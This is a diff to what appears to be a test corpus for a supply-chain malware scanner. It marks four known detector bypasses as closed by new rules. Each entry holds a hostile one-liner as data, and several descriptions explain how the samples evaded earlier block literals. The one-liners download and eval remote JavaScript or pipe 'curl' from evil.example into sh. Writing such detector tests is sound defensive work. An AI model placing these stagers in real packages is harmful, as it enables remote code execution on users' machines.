@@ -53,14 +53,14 @@ module.exports = [
   {
     id: 'sc-githubusercontent-eval',
     category: 'supply-chain', technique: 'raw-github-fetch-eval', severity: 'HIGH',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: REMOTE_FETCH_EXEC rule (Phase 2)
     description: 'Fetches a payload from raw.githubusercontent.com and eval\'s it — host not a bad literal, fetch+eval is not a chained rule',
     code: `fetch('https://raw.githubusercontent.com/evil/x/main/p.js').then(r=>r.text()).then(t=>(0,eval)(t)); module.exports = {};`,
   },
   {
     id: 'sc-transfer-sh',
     category: 'supply-chain', technique: 'transfer-sh-stager', severity: 'HIGH',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: REMOTE_FETCH_EXEC rule (Phase 2)
     description: 'Downloads and executes a second stage from transfer.sh',
     code: `fetch('https://transfer.sh/abc/stage2.js').then(r=>r.text()).then(t=>new Function(t)()); module.exports = {};`,
   },
@@ -110,7 +110,7 @@ module.exports = [
   {
     id: 'sc-s3-remote-config-eval',
     category: 'supply-chain', technique: 's3-remote-config-eval', severity: 'HIGH',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: REMOTE_FETCH_EXEC rule (Phase 2)
     description: 'Loads "remote config" from an S3 bucket and eval\'s it',
     code: `fetch('https://mybucket.s3.amazonaws.com/config.js').then(r=>r.text()).then(t=>eval(t)); module.exports = {};`,
   },
@@ -131,7 +131,7 @@ module.exports = [
   {
     id: 'sc-preinstall-curl-sh',
     category: 'supply-chain', technique: 'postinstall-curl-pipe-sh', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: pipe-to-shell BLOCK_REGEXES (Phase 1)
     description: 'curl ... | sh stager — only "| bash" is a block literal, so piping into sh slips past',
     code: `require('child_process').execSync('curl -s https://evil.example/i.sh | sh');`,
   },
